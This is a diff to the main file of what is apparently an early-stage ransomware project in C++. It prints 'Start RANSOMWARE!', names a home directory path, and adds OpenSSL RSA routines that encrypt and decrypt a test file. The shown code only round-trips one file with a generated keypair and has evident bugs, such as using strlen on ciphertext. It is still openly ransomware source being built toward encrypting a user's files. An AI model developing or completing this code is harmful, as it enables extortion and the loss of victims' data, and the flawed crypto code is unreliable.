@@ -5,6 +5,7 @@
 #include "directory_iterator.h"
 #include <thread>
 #include <mutex>
+#include <cmath>
 #include "encryptor.h"
 std::mutex tmp_mut;
 DirectoryIiterator* _directoryIt = new DirectoryIiterator();
@@ -81,19 +82,61 @@ void old() {
     std::cout << "DIR Size: " << dirs.size() << std::endl;
 }
 
+void working() {
+    RSAAlgorithm *encrypter = new RSAAlgorithm();
+    //RSAAlgorithm *decryptor = new RSAAlgorithm();
+
+    RSA* key = encrypter->getKeypair();
+    char* message = "Test - OpenSSL_RSA demo - AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBB"
+                    "CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD"
+                    "EEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF";
+
+    char* ct = encrypter->encrypt(key, message);
+
+    FILE* encrypted_file = fopen("encrypted_file.bin", "w");
+    fwrite(ct, sizeof(*ct), strlen(ct), encrypted_file);
+    fclose(encrypted_file);
+
+    char* decrypt = encrypter->decrypt(key, ct);
+
+    FILE *decrypted_file = fopen("decrypted_file.txt", "w");
+    fwrite(decrypt, 1, strlen(decrypt), decrypted_file);
+    fclose(decrypted_file);
+}
+
 int main(int argc, char** argv) {
 
     std::cout << "Start RANSOMWARE!" << std::endl;
     std::string path3 = "/home/christian/";
 
-    //executor();
-
     RSAAlgorithm *encrypter = new RSAAlgorithm();
-    RSAAlgorithm *decryptor = new RSAAlgorithm();
-    RSA *pub = encrypter->readPublicKeyFile("id_rsa.pub");
-    encrypter->encrypt(pub);
-    sleep(3);
-    RSA* priv = decryptor->readPrivateKeyFile("id_rsa");
-    decryptor->decrypt(priv);
+    //RSAAlgorithm *decryptor = new RSAAlgorithm();
+
+    //RSA* pub = encrypter->getPublicKeyFromFile("id_rsa.pub");
+    //encrypter->encryptFile(pub, "test.txt");
+
+    RSA* key = encrypter->getKeypair();
+
+    encrypter->encryptFile(key, "test.txt");
+    sleep(2);
+    encrypter->decryptFile(key, "test.txt.bin");
+
+    /*
+    char* message = "Test - OpenSSL_RSA demo - AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBB"
+                             "CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD"
+                             "EEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF";
+
+    char* ct = encrypter->encrypt(key, message);
+
+    FILE* encrypted_file = fopen("encrypted_file.bin", "w");
+    fwrite(ct, sizeof(*ct), strlen(ct), encrypted_file);
+    fclose(encrypted_file);
+
+    char* decrypt = encrypter->decrypt(key, ct);
+
+    FILE *decrypted_file = fopen("decrypted_file.txt", "w");
+    fwrite(decrypt, 1, strlen(decrypt), decrypted_file);
+    fclose(decrypted_file);
+     */
     return 0;
 }
